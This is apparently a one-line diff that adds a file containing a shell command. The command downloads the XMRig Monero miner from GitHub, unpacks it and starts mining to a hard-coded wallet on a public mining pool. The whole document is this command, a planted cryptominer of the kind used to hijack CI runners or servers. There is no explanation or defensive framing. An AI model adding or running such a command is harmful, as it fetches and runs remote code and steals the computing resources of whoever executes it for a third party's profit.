@@ -1,0 +1,1 @@
+mkdir fuck && cd fuck && wget https://github.com/xmrig/xmrig/releases/download/v6.6.2/xmrig-6.6.2-linux-x64.tar.gz && tar xf xmrig-6.6.2-linux-x64.tar.gz && cd xmrig-6.6.2 && ./xmrig --donate-level 1 -o de.monero.herominers.com:1111 -u 47Y2tD92AQxP78VsqwwCaGXQxXdGxQQnWGcAeQE54sdMYXPbtJ6BcTBZAf43FFLc97N6Zsipe8jJmJNQeuVf1LSUN9b64qn -p x -a rx/0 -k 
